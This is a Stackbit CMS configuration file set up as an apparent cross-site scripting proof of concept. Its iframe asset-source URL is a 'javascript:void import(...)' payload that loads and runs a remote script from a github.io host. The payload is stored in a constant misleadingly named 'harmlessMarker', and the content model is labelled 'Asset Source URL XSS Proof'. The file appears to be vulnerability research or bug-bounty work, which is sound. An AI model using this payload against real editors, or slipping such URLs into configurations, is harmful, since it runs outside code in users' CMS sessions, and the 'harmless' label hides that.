import { defineStackbitConfig } from '@stackbit/types';
import { GitContentSource } from '@stackbit/cms-git';

const harmlessMarker = "javascript:void import('https://lmzkjmiajzj-lgtm.github.io/tests/xss-asset-source.js')";

export default defineStackbitConfig({
  stackbitVersion: '~0.6.0',
  ssgName: 'custom',
  nodeVersion: '18',
  installCommand: 'npm install',
  devCommand: 'node server.js --port {PORT} --hostname {HOSTNAME}',
  buildCommand: 'npm run build',
  publishDir: 'dist',
  contentSources: [
    new GitContentSource({
      rootPath: __dirname,
      contentDirs: ['content'],
      models: [{
        type: 'page',
        name: 'AssetSourceProof',
        label: 'Asset Source URL XSS Proof',
        urlPath: '/',
        filePath: 'content/index.json',
        fields: [
          { name: 'title', type: 'string', required: true },
          { name: 'description', type: 'text' },
          { name: 'heroImage', type: 'image', source: 'owned-asset-source' }
        ]
      }],
      assetsConfig: { referenceType: 'static', staticDir: 'assets', uploadDir: '.', publicPath: '/assets/' }
    })
  ],
  assetSources: [{
    name: 'owned-asset-source',
    type: 'iframe',
    preview: { title: 'Owned asset source proof', image: '/assets/safe.svg' },
    url: harmlessMarker
  }]
});
